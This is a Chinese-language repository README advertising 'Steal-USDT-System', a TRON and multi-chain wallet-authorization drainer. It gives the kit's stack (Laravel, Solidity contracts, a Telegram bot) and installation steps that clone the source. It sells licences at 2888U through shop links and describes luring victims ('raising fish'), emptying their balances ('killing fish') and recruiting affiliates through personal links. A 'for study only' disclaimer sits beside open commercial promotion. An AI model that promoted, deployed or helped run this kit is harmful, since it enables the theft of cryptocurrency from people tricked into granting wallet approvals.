# Steal-USDT-System

> 盗U系统 - 盗U自动发卡 - 多签/合约方式 - TRON 钱包授权管理系统

<p align="center">
  <img src="https://input-s3.mn.input.im/20250613/7daff4c935d3ff9a8db0c02f6e5f99d5.png" width="275" alt="logo" />
</p>

<p align="center">
  <strong>一款支持多链的钱包授权养鱼秒余额的系统</strong><br>
  <a href="https://aloure-web.top/archives/29">中文</a>｜<a href="https://aloure-web.top/archives/29">English</a>｜<a href="https://aloure-web.top/archives/29">Русский</a>
</p>

---

## 简介

| | |
|---|---|
| 前端 UI | [Bootstrap](https://getbootstrap.com/) |
| 后端框架 | [Laravel](https://github.com/laravel/laravel) |
| 管理后台 | [laravel-admin](https://laravel-admin.org/) |
| 合约语言 | Solidity ^0.8.0 |
| 机器人 | Node.js + node-telegram-bot-api |

采用业界流行的 `Laravel` 框架，安全及稳定性提升。

- 支持 **自定义前端模板** 功能
- 支持 **国际化多语言包**（需自行翻译）
- 代码全部开源，所有扩展包采用 Composer 加载，代码所有内容可溯源
- 长期技术更新支持

---

## 环境要求

| 组件 | 最低版本 |
|------|----------|
| PHP + PHP-CLI | 7.4 |
| Nginx | >= 1.16 |
| MySQL | >= 5.6 |
| Redis | — (高性能缓存服务) |
| Supervisor | — (进程管理) |
| Composer | — (PHP 包管理器) |
| 操作系统 | Linux (Windows 未测试) |

---

## 免责声明

近期有高仿作者 Telegram 实施诈骗的行为，请各位用户擦亮双眼。**作者从不私聊任何人提供任何收费形式的技术支持服务！**

- 项目是完全开源免费的，完全遵守 **MIT 开源协议**
- 没有所谓的"技术支持"、"终身技术支持"、"二次开发"等业务
- 不参与任何用户的业务运营
- 凡是作者私聊你的全是高仿号诈骗
- **作者唯一 Telegram 用户名：[@TGCCTG](https://t.me/TGCCTG)**

程序是辛苦开发的产品，**仅用于学习交流使用**！
不可用于任何违反 **中华人民共和国(含台湾省)** 或 **使用者所在地区** 法律法规的用途。
使用者将程序源代码用于何种用途所带来的任何法律责任由用户自己承担。

---

## 入门

### 安装

本程序有一定的上手难度，需要您对 Linux 服务器有基本的认识和操作度。
不支持虚拟主机，大概率也不支持 Windows 服务器。

如果您连宝塔、phpstudy、AppNode 等一键可视化服务器面板也未曾使用，那么大概率劝您放弃。
认真观看部署教程可以保证 98% 能部署成功。**勤动手，多思考，善研究！**

**部署步骤：**

1. 购买服务器与域名
2. 安装宝塔面板以及域名解析
3. 安装扩展
4. 上传源码以及导入数据库

```bash
git clone https://github.com/cnmbdb/Alure-du.git
cd Alure-du/主程序源码
cp .env.example .env
# 编辑 .env 配置数据库连接
composer install
php artisan key:generate
```

> 详细部署文档：[page.aloure-web.top](https://page.aloure-web.top/intro/deployment)

### 升级

**小版本更新：** 如果版本未作任何需要工具更新的说明或没有数据库表结构更新，直接全量覆盖源代码即可。

建议方式：保留 `.env` 和 `install.lock` 文件，然后全量覆盖，再替换原文件。

> ⚠️ 做任何操作之前请备份好原数据，养成好习惯。

---

## 核心功能

### 授权

- 本版本涵盖 **9 个渠道**
- 新增可一键代理模式
- 旧版本客户可优惠升级
- **优惠价 2888U 买断制**
- 3 个月免费更新维护
- 永久可优惠更新（看更新程度定价）

| 🛒 商城链接 | 📦 提货链接 |
|---|---|
| [点击前往](https://tyy11.com/?id=trc796503150) | [点击前往](https://tyy11.com/buy/1?id=trc796503150) |

### 养鱼

成功后会在群里通知用户。

### 杀鱼

在群里直接用命令即可。

### 代理

新增可一键代理模式，群内有机器人对接，群内人员可一键发指令，生成专属代理链接。

有需要联系客服 [@TGCCTG](https://t.me/TGCCTG)

---

## 常见问题

- PHP 终端环境对应不上
- 后台管理密码忘记了
- 邮件服务配置
- 修改后台登录地址
- HTTPS-ERROR
- 更换模板
- 各支付对应配置
- 后台登录出现 `0 err 500` 错误
- 上传了图片不显示或图片显示错误
- 后台操作提交出现 `500` 错误

---

## 相关链接

| 资源 | 地址 |
|------|------|
| 文档站 | [page.aloure-web.top](https://page.aloure-web.top) |
| 主仓库 | [github.com/cnmbdb/Alure-du](https://github.com/cnmbdb/Alure-du) |
| 本文档仓库 | [github.com/raquelhuss/Steal-USDT-System](https://github.com/raquelhuss/Steal-USDT-System) |
| Telegram | [@TGCCTG](https://t.me/TGCCTG) |

---

## License

MIT © Alouer-Steal-System
